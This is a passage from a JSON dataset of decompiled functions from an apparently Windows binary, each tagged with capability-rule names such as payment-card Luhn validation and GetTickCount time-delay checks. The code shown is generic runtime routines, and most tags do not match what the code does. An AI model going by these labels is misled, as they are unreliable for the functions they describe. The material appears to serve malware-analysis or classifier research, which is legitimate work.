        "decompiled_code": "\nvoid fcn.004033a8(void)\n\n{\n    int32_t iVar1;\n    uchar auStack8 [8];\n    \n    iVar1 = sub.kernel32.dll_QueryPerformanceCounter();\n    if (iVar1 != 0) {\n        *0x4a1008 = auStack8;\n        return;\n    }\n    *0x4a1008 = sub.kernel32.dll_GetTickCount();\n    return;\n}\n",
        "token_count": 88
    },
    "00403960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403960(uint8_t param_1, uint8_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t *in_EAX;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    \n    uVar3 = *param_2;\n    uVar2 = *in_EAX + uVar3;\n    if (((!CARRY1(*in_EAX, uVar3)) && (uVar2 <= param_1)) ||\n       (uVar3 = param_1 - *in_EAX,  uVar2 = param_1,  *in_EAX <= param_1 && uVar3 != 0)) {\n        uVar1 = *in_EAX;\n        *in_EAX = uVar2;\n        puVar5 = param_2 + 1;\n        puVar6 = in_EAX + uVar1 + 1;\n        for (uVar4 = uVar3; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar6 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar6 = puVar6 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 300
    },
    "00403ae4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403ae4(uchar param_1, int32_t param_2)\n\n{\n    ulong uVar1;\n    ulong *in_EAX;\n    ushort uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    \n    uVar2 = CONCAT11(param_1, param_1);\n    if (0x1f < param_2) {\n        *in_EAX = uVar2;\n        *(in_EAX + 2) = uVar2;\n        *(in_EAX + 4) = uVar2;\n        *(in_EAX + 6) = uVar2;\n        uVar1 = *in_EAX;\n        *(param_2 + -0x10 + in_EAX) = uVar1;\n        *(param_2 + -8 + in_EAX) = uVar1;\n        iVar3 = (in_EAX & 7) - 8;\n        iVar4 = param_2 + -0x10 + iVar3;\n        iVar3 = iVar4 - iVar3;\n        iVar4 = -iVar4;\n        do {\n            *(in_EAX + iVar4 + iVar3) = uVar1;\n            *(in_EAX + iVar4 + 8 + iVar3) = uVar1;\n            bVar5 = SCARRY4(iVar4, 0x10);\n            iVar4 = iVar4 + 0x10;\n        } while (bVar5 != iVar4 < 0);\n        return;\n    }\n    *(param_2 + -1 + in_EAX) = param_1;\n    switch(param_2) {\n    default:\n        return;\n    case 0x1e:\n    case 0x1f:\n        *(in_EAX + 0x1c) = uVar2;\n    case 0x1c:\n    case 0x1d:\n        *(in_EAX + 0x1a) = uVar2;\n    case 0x1a:\n    case 0x1b:\n        *(in_EAX + 3) = uVar2;\n    case 0x18:\n    case 0x19:\n        *(in_EAX + 0x16) = uVar2;\n    case 0x16:\n    case 0x17:\n        *(in_EAX + 0x14) = uVar2;\n    case 0x14:\n    case 0x15:\n        *(in_EAX + 0x12) = uVar2;\n    case 0x12:\n    case 0x13:\n        *(in_EAX + 2) = uVar2;\n    case 0x10:\n    case 0x11:\n        *(in_EAX + 0xe) = uVar2;\n    case 0xe:\n    case 0xf:\n        *(in_EAX + 0xc) = uVar2;\n    case 0xc:\n    case 0xd:\n        *(in_EAX + 10) = uVar2;\n    case 10:\n    case 0xb:\n        *(in_EAX + 1) = uVar2;\n    case 8:\n    case 9:\n        *(in_EAX + 6) = uVar2;\n    case 6:\n    case 7:\n        *(in_EAX + 4) = uVar2;\n    case 4:\n    case 5:\n        *(in_EAX + 2) = uVar2;\n    case 2:\n    case 3:\n        *in_EAX = uVar2;\n        return;\n    }\n}\n",
        "token_count": 781
    },
    "00403cb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00403cb4(void)\n\n{\n    uint uVar1;\n    char cStack264;\n    \n    fcn.0040546c();\n    fcn.00403ca8();\n    uVar1 = fcn.004056d0();\n    while (cStack264 == -1) {\n        fcn.00403ca8();\n        fcn.004056d0();\n        fcn.00405738();\n        fcn.0040546c();\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 119
    },
    "00403fcc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403fcc(int32_t param_1, uchar *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    \n    if ((*(in_EAX + 4) == -0x284e) || (cVar1 = fcn.00403f88(param_1, param_2),  cVar1 != '\\0')) {\n        while( true ) {\n            puVar3 = *(in_EAX + 0x14) + *(in_EAX + 0xc);\n            iVar2 = *(in_EAX + 8) - *(in_EAX + 0xc);\n            if (param_1 < iVar2) break;\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + iVar2;\n            param_1 = param_1 - iVar2;\n            for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = *param_2;\n                param_2 = param_2 + 1;\n                puVar3 = puVar3 + 1;\n            }\n            iVar2 = (**(in_EAX + 0x1c))();\n            if (iVar2 != 0) {\n                fcn.0040306c();\n                return in_EAX;\n            }\n        }\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + param_1;\n        for (; param_1 != 0; param_1 = param_1 + -1) {\n            *puVar3 = *param_2;\n            param_2 = param_2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n    }\n    return in_EAX;\n}\n",
        "token_count": 399
    },
    "00404608": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00404608(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + -0x28);\n}\n",
        "token_count": 33
    },
    "00404610": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404610(uint param_1, char param_2)\n\n{\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "004046c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004046c4(int32_t **param_1, code *UNRECOVERED_JUMPTABLE)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t **ppiVar2;\n    \n    if (UNRECOVERED_JUMPTABLE < 0xff000000) {\n        if (0xfdffffff < UNRECOVERED_JUMPTABLE) {\n    // WARNING: Could not recover jumptable at 0x004046db. Too many branches\n    // WARNING: Treating indirect jump as call\n            (**(UNRECOVERED_JUMPTABLE + *in_EAX))();\n            return;\n        }\n    // WARNING: Could not recover jumptable at 0x004046dd. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*UNRECOVERED_JUMPTABLE)();\n        return;\n    }\n    ppiVar2 = *((UNRECOVERED_JUMPTABLE & 0xffffff) + in_EAX);\n    if (ppiVar2 == NULL) {\n        piVar1 = *param_1;\n        *param_1 = NULL;\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 8))(piVar1);\n        }\n        return;\n    }\n    (*(*ppiVar2)[1])(ppiVar2, param_1, ppiVar2);\n    piVar1 = *ppiVar2;\n    *ppiVar2 = param_1;\n    if (piVar1 == NULL) {\n        return;\n    }\n    (**(*piVar1 + 8))(piVar1);\n    return;\n}\n",
        "token_count": 359
    },
    "00404788": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00404788(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    do {\n        piVar1 = *(in_EAX + -0x48);\n        if (piVar1 != NULL) {\n            iVar2 = *piVar1;\n            piVar1 = piVar1 + 1;\n            do {\n                if ((((*param_2 == *piVar1) && (param_2[1] == piVar1[1])) && (param_2[2] == piVar1[2])) &&\n                   (param_2[3] == piVar1[3])) {\n                    return piVar1;\n                }\n                piVar1 = piVar1 + 7;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        if (*(in_EAX + -0x24) == NULL) {\n            return NULL;\n        }\n        in_EAX = **(in_EAX + -0x24);\n    } while( true );\n}\n",
        "token_count": 251
    },
    "0040480c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040480c(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint16_t unaff_SI;\n    uint16_t *puVar2;\n    bool bVar3;\n    \n    do {\n        puVar2 = *(in_EAX + -0x30);\n        if (puVar2 != NULL) {\n            uVar1 = *puVar2;\n            bVar3 = puVar2 + 1 == NULL;\n            puVar2 = puVar2 + 1;\n            do {\n                if (uVar1 == 0) break;\n                uVar1 = uVar1 - 1;\n                bVar3 = unaff_SI == *puVar2;\n                puVar2 = puVar2 + 1;\n            } while (!bVar3);\n            if (bVar3) {\n                return;\n            }\n        }\n        if (*(in_EAX + -0x24) == NULL) {\n            return;\n        }\n        in_EAX = **(in_EAX + -0x24);\n    } while( true );\n}\n",
        "token_count": 236
    },
    "00404880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00404880(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + -0x3c);\n}\n",
        "token_count": 34
    },
    "004048c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004048c4(uint param_1, uint8_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint16_t *puVar4;\n    uint32_t uVar5;\n    \n    uVar1 = 0;\n    uVar5 = 0;\n    uVar3 = *param_2;\n    while( true ) {\n        puVar4 = *(in_EAX + -0x34);\n        if (puVar4 != NULL) {\n            uVar5 = uVar5 & 0xffff0000 | *puVar4;\n            puVar4 = puVar4 + 1;\n            do {\n                uVar2 = uVar1 & 0xffffff00;\n                if (*(puVar4 + 3) == uVar3) {\n                    uVar2 = uVar1 & 0xffff0000 | *(puVar4 + 3);\n                    while (((*(uVar2 + 6 + puVar4) ^ param_2[uVar2]) & 0xdf) == 0) {\n                        uVar2 = uVar2 - 1;\n                        if (uVar2 == 0) {\n                            return *(puVar4 + 1);\n                        }\n                    }\n                    uVar3 = *param_2;\n                }\n                uVar1 = uVar2 & 0xffff0000 | *puVar4;\n                puVar4 = puVar4 + uVar1;\n                uVar5 = uVar5 - 1;\n            } while (uVar5 != 0);\n        }\n        if (*(in_EAX + -0x24) == NULL) break;\n        in_EAX = **(in_EAX + -0x24);\n    }\n    return 0;\n}\n",
        "token_count": 401
    },
    "004049bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004049bc(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4049eb;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    (**(*in_EAX + -0x1c))();\n    *in_FS_OFFSET = uStack32;\n    return in_EAX;\n}\n",
        "token_count": 132
    },
    "00404edc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00404edc(void)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint *in_FS_OFFSET;\n    uint *in_stack_00000014;\n    int32_t in_stack_00000030;\n    \n    *(in_stack_00000030 + 4) = 0x404f27;\n    piVar3 = fcn.004075b8();\n    piVar2 = *piVar3;\n    *piVar3 = *piVar2;\n    piVar2 = piVar2[3];\n    puVar1 = piVar2 + 1;\n    *puVar1 = *puVar1 & 0xfffffffd;\n    if (*piVar2 != 0xeedfade) {\n        fcn.00404640();\n        fcn.00404a1c();\n    }\n    *in_stack_00000014 = **in_FS_OFFSET;\n    return 1;\n}\n",
        "token_count": 215
    },
    "00404f78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404f78(int32_t *arg_8h)\n\n{\n    fcn.00402fe8();\n    return;\n}\n",
        "token_count": 34
    },
    "0040520c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040520c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *in_EAX;\n    do {\n        fcn.00407480();\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 73
    },
    "00405234": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405234(void)\n\n{\n    int32_t *in_EAX;\n    int32_t **ppiVar1;\n    int32_t iVar2;\n    \n    iVar2 = *in_EAX;\n    ppiVar1 = in_EAX + 1;\n    do {\n        **ppiVar1 = *ppiVar1[1] + ppiVar1[2];\n        ppiVar1 = ppiVar1 + 3;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    return;\n}\n",
        "token_count": 121
    },
    "00405490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405490(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    \n    do {\n        iVar2 = *in_EAX;\n        if ((iVar2 != 0) && (*in_EAX = 0,  0 < *(iVar2 + -8))) {\n            LOCK();\n            piVar1 = iVar2 + -8;\n            *piVar1 = *piVar1 + -1;\n            if (*piVar1 == 0) {\n                fcn.00402f0c();\n            }\n        }\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return;\n}\n",
        "token_count": 183
    },
    "00405530": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.00405530(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    if (0 < in_EAX) {\n        puVar1 = fcn.00402ef0();\n        *(((in_EAX + 10U & 0xfffffffe) - 2) + puVar1) = 0;\n        puVar1[1] = in_EAX;\n        *puVar1 = 1;\n        return puVar1 + 2;\n    }\n    return NULL;\n}\n",
        "token_count": 117
    },
    "004055c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004055c8(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_1 < 1) {\n        fcn.0040546c(param_2);\n    }\n    else if ((param_1 + 1 < 0x7ff) && (iVar1 = fcn.0040558c(param_1),  -1 < iVar1)) {\n        fcn.0040555c();\n    }\n    else {\n        fcn.00405b8c();\n        fcn.0040558c(param_1);\n        fcn.00405b8c();\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "00405664": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405664(uint param_1, char *param_2)\n\n{\n    uint uVar1;\n    uint *in_EAX;\n    char *pcVar2;\n    \n    pcVar2 = param_2;\n    if (param_2 != NULL) {\n        for (; (((*pcVar2 != '\\0' && (pcVar2[1] != '\\0')) && (pcVar2[2] != '\\0')) && (pcVar2[3] != '\\0'));\n            pcVar2 = pcVar2 + 4) {\n        }\n    }\n    uVar1 = fcn.00405530();\n    if (param_2 != NULL) {\n        fcn.004030ec();\n    }\n    fcn.0040546c();\n    *in_EAX = uVar1;\n    return;\n}\n",
        "token_count": 182
    },
    "004056dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004056dc(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *in_EAX;\n    char *pcVar3;\n    \n    pcVar3 = param_2;\n    do {\n        if (param_1 == 0) break;\n        param_1 = param_1 + -1;\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    uVar2 = fcn.00405530();\n    if (param_2 != NULL) {\n        fcn.004030ec();\n    }\n    fcn.0040546c();\n    *in_EAX = uVar2;\n    return;\n}\n",
        "token_count": 175
    },
    "00405738": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __fastcall fcn.00405738(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    \n    if (param_2 == 0) {\n        return;\n    }\n    iVar2 = *in_EAX;\n    if (iVar2 != 0) {\n        if (!SCARRY4(*(param_2 + -4), *(iVar2 + -4))) {\n            if (param_2 == iVar2) {\n                fcn.00405b8c();\n            }\n            else {\n                fcn.00405b8c();\n            }\n            fcn.004030ec();\n            return;\n        }\n        if (*0x4a6008 != NULL) {\n            (**0x4a6008)(param_2);\n        }\n        fcn.00402fe8();\n        return;\n    }\n    if (param_2 != 0) {\n        iVar2 = *(param_2 + -8);\n        if (iVar2 == -1 || SCARRY4(iVar2, 1) != iVar2 + 1 < 0) {\n            param_2 = fcn.00405530(param_2);\n            fcn.004030ec();\n        }\n        else {\n            LOCK();\n            *(param_2 + -8) = *(param_2 + -8) + 1;\n        }\n    }\n    iVar2 = *in_EAX;\n    *in_EAX = param_2;\n    if ((iVar2 != 0) && (0 < *(iVar2 + -8))) {\n        LOCK();\n        piVar1 = iVar2 + -8;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.00402f0c();\n        }\n    }\n    return;\n}\n",
        "token_count": 421
    },
    "00405784": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __fastcall fcn.00405784(int32_t **param_1, int32_t **param_2)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t **ppiVar3;\n    int32_t **in_EAX;\n    int32_t iVar4;\n    \n    ppiVar3 = param_1;\n    if ((param_2 != NULL) && (ppiVar3 = param_2,  param_1 != NULL)) {\n        if (param_2 != *in_EAX) {\n            if (param_1 == *in_EAX) {\n                in_EAX = param_2;\n                if (!SCARRY4(param_2[-1], param_1[-1])) {\n                    iVar4 = fcn.00405530();\n                    fcn.004030ec();\n                    fcn.004030ec();\n                    if (iVar4 != 0) {\n                        *(iVar4 + -8) = *(iVar4 + -8) + -1;\n                    }\n                    fcn.004054c0();\n                    return;\n                }\n                goto code_r0x00402ff4;\n            }\n            fcn.004054c0();\n        }\n        if (param_1 == NULL) {\n            return;\n        }\n        ppiVar2 = *in_EAX;\n        ppiVar3 = param_1;\n        if (ppiVar2 != NULL) {\n            if (!SCARRY4(param_1[-1], ppiVar2[-1])) {\n                if (param_1 == ppiVar2) {\n                    fcn.00405b8c();\n                }\n                else {\n                    fcn.00405b8c();\n                }\n                fcn.004030ec();\n                return;\n            }\ncode_r0x00402ff4:\n            if (*0x4a6008 != NULL) {\n                (**0x4a6008)(param_1, in_EAX);\n            }\n            fcn.00402fe8();\n            return;\n        }\n    }\n    if (ppiVar3 != NULL) {\n        piVar1 = ppiVar3[-2];\n        if (piVar1 == 0xffffffff || SCARRY4(piVar1, 1) != piVar1 + 1 < 0) {\n            ppiVar3 = fcn.00405530(ppiVar3);\n            fcn.004030ec();\n        }\n        else {\n            LOCK();\n            ppiVar3[-2] = ppiVar3[-2] + 1;\n        }\n    }\n    piVar1 = *in_EAX;\n    *in_EAX = ppiVar3;\n    if ((piVar1 != NULL) && (0 < piVar1[-2])) {\n        LOCK();\n        piVar1 = piVar1 + -2;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.00402f0c();\n        }\n    }\n    return;\n}\n",
        "token_count": 660
    },
    "00405800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __fastcall fcn.00405800(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    bool bVar5;\n    code *UNRECOVERED_JUMPTABLE;\n    int32_t iStack24;\n    \n    piVar4 = NULL;\n    piVar1 = *(&stack0x00000000 + param_2 * 4);\n    if ((piVar1 == NULL) || (*in_EAX != piVar1)) {\n        iVar2 = 0;\n        iVar3 = param_2;\n    }\n    else {\n        iVar2 = piVar1[-1];\n        iVar3 = param_2 + -1;\n        piVar4 = piVar1;\n    }\n    do {\n        piVar1 = *(&stack0x00000000 + iVar3 * 4);\n        if (piVar1 != NULL) {\n            bVar5 = SCARRY4(iVar2, piVar1[-1]);\n            iVar2 = iVar2 + piVar1[-1];\n            if (bVar5) {\n                if (*0x4a6008 != NULL) {\n                    (**0x4a6008)();\n                }\n                fcn.00402fe8();\n                return;\n            }\n            if (piVar4 == piVar1) {\n                piVar4 = NULL;\n            }\n        }\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    if (piVar4 == NULL) {\n        iStack24 = fcn.00405530();\n    }\n    else {\n        fcn.00405b8c();\n        iStack24 = *in_EAX;\n        param_2 = param_2 + -1;\n        piVar4 = in_EAX;\n    }\n    do {\n        if (*(&stack0x00000000 + param_2 * 4) != 0) {\n            fcn.004030ec();\n        }\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    if (piVar4 == NULL) {\n        if (iStack24 != 0) {\n            *(iStack24 + -8) = *(iStack24 + -8) + -1;\n        }\n        fcn.004054c0();\n    }\n    // WARNING: Could not recover jumptable at 0x00405889. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*UNRECOVERED_JUMPTABLE)();\n    return;\n}\n",
        "token_count": 592
    },
    "00405964": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405964(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((((in_EAX == 0) || (*(in_EAX + -4) == 0)) || ((0 < param_2 && (*(in_EAX + -4) <= param_2 + -1)))) ||\n       (param_1 < 0)) {\n        fcn.0040546c();\n    }\n    else {\n        fcn.0040555c();\n    }\n    return;\n}\n",
        "token_count": 121
    },
    "004059a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004059a4(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.00405954();\n    if (*in_EAX != 0) {\n        if (((0 < param_2) && (param_2 + -1 < *(*in_EAX + -4))) && (0 < param_1)) {\n            fcn.004030ec();\n            fcn.00405b8c();\n        }\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "004059ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004059ec(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        fcn.00405b8c();\n        fcn.004030ec();\n        fcn.004030ec();\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "00405a48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.00405a48(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    bool bVar8;\n    \n    if ((param_2 != 0) && (in_EAX != 0)) {\n        iVar5 = *(in_EAX + -4);\n        if ((iVar5 <= *(param_2 + -4)) && (0 < iVar5)) {\n            iVar5 = iVar5 + -1;\n            pcVar6 = *(param_2 + -4) + param_2;\n            pcVar4 = param_2 + iVar5;\n            pcVar2 = in_EAX + iVar5;\n            iVar5 = -iVar5;\n            cVar1 = *pcVar2;\n            if (iVar5 != 0) {\n                pcVar3 = pcVar4;\ncode_r0x00405b20:\n                iVar7 = iVar5;\n                if (cVar1 == *pcVar3) goto code_r0x00405b6f;\ncode_r0x00405b24:\n                iVar7 = iVar5;\n                if (cVar1 == pcVar3[1]) goto code_r0x00405b42;\n                while (pcVar3 = pcVar3 + 2,  pcVar3 < pcVar6 + -2) {\n                    while( true ) {\n                        iVar7 = iVar5;\n                        if (cVar1 == *pcVar3) goto code_r0x00405b6f;\n                        if (cVar1 == pcVar3[1]) goto code_r0x00405b42;\n                        if (cVar1 == pcVar3[2]) {\n                            pcVar3 = pcVar3 + 2;\n                            goto code_r0x00405b6f;\n                        }\n                        if (cVar1 == pcVar3[3]) break;\n                        pcVar3 = pcVar3 + 4;\n                        if (pcVar6 + -2 <= pcVar3) {\n                            if (pcVar6 <= pcVar3) {\n                                return NULL;\n                            }\n                            goto code_r0x00405b20;\n                        }\n                    }\n                    pcVar3 = pcVar3 + 2;\ncode_r0x00405b42:\n                    while (*(pcVar2 + iVar7) == *(pcVar3 + iVar7 + 1)) {\n                        bVar8 = SCARRY4(iVar7, 2);\n                        iVar7 = iVar7 + 2;\n                        if (bVar8 == iVar7 < 0) {\n                            if (pcVar3 + 2 <= pcVar6) {\n                                return pcVar3 + 2 + -pcVar4;\n                            }\n                            return NULL;\n                        }\n                    }\n                }\n                if (pcVar6 <= pcVar3) {\n                    return NULL;\n                }\n                goto code_r0x00405b20;\n            }\n            pcVar2 = pcVar4;\n            while (cVar1 != *pcVar2) {\n                if (cVar1 == pcVar2[1]) {\ncode_r0x00405adc:\n                    pcVar3 = NULL;\n                    if (pcVar2 + 2 <= pcVar6) {\n                        pcVar3 = pcVar2 + 2 + -pcVar4;\n                    }\n                    return pcVar3;\n                }\n                pcVar2 = pcVar2 + 2;\n                if (pcVar2 < pcVar6 + -2) {\n                    do {\n                        if (cVar1 == *pcVar2) goto code_r0x00405acc;\n                        if (cVar1 == pcVar2[1]) goto code_r0x00405adc;\n                        if (cVar1 == pcVar2[2]) {\n                            pcVar2 = pcVar2 + 2;\n                            goto code_r0x00405acc;\n                        }\n                        if (cVar1 == pcVar2[3]) {\n                            pcVar2 = pcVar2 + 2;\n                            goto code_r0x00405adc;\n                        }\n                        pcVar2 = pcVar2 + 4;\n                    } while (pcVar2 < pcVar6 + -2);\n                    if (pcVar6 <= pcVar2) {\n                        return NULL;\n                    }\n                }\n                else if (pcVar6 <= pcVar2) {\n                    return NULL;\n                }\n            }\ncode_r0x00405acc:\n            return pcVar2 + (1 - pcVar4);\n        }\n    }\n    return NULL;\ncode_r0x00405b6f:\n    while (*(pcVar2 + iVar7) == *(pcVar3 + iVar7)) {\n        bVar8 = SCARRY4(iVar7, 2);\n        iVar7 = iVar7 + 2;\n        if (bVar8 == iVar7 < 0) {\n            return pcVar3 + (1 - pcVar4);\n        }\n    }\n    goto code_r0x00405b24;\n}\n",
        "token_count": 1102
    },
    "00405c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
